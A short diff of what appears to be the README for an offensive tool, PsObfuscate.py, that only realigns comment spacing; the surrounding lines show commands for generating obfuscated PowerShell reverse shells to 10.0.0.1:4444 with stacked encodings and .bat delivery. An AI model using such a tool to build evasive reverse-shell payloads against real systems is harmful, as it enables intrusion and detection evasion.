@@ -45,9 +45,9 @@ python3 PsObfuscate.py
 python3 PsObfuscate.py -i 10.0.0.1 -p 4444                  # basic reverse shell
 python3 PsObfuscate.py -i 10.0.0.1 -p 4444 -t A             # advanced obfuscation
 python3 PsObfuscate.py -i 10.0.0.1 -p 4444 -t 6,1 -d bat    # stacked encoding, .bat delivery
-python3 PsObfuscate.py -f script.ps1 -t 1                    # encode a custom file
+python3 PsObfuscate.py -f script.ps1 -t 1                   # encode a custom file
 python3 PsObfuscate.py -i 10.0.0.1 -p 4444 -q               # quiet mode for piping
-python3 PsObfuscate.py --list                                 # show all encodings & formats
+python3 PsObfuscate.py --list                               # show all encodings & formats
 ```
 
 ## Encoding Layers
